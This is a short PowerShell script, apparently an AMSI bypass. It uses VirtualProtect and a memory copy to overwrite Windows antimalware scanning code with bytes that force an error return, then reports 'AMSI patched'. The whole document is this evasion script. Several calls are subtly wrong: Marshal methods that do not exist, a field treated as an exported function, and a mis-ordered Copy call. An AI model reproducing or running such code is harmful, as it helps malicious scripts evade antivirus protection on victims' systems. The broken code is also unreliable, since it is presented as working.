$dll = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').Location
$mod = [System.Runtime.InteropServices.Marshal]
$addr = $mod::GetProcAddress($mod::GetModuleHandle($dll), 'AmsiInitFailed')
$oldProtect = [IntPtr]::Zero
$VirtualProtect = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect)' -Name "VP" -Namespace "W32" -PassThru
$buf = [byte[]]@(0xB8,0x57,0x00,0x07,0x80,0xC3)
$VirtualProtect::VirtualProtect($addr, [uint32]$buf.Length, 0x40, [ref]$oldProtect) | Out-Null
$mod::Copy($addr, $buf, $buf.Length)
$VirtualProtect::VirtualProtect($addr, [uint32]$buf.Length, $oldProtect, [ref]$oldProtect) | Out-Null
Write-Output "AMSI patched"
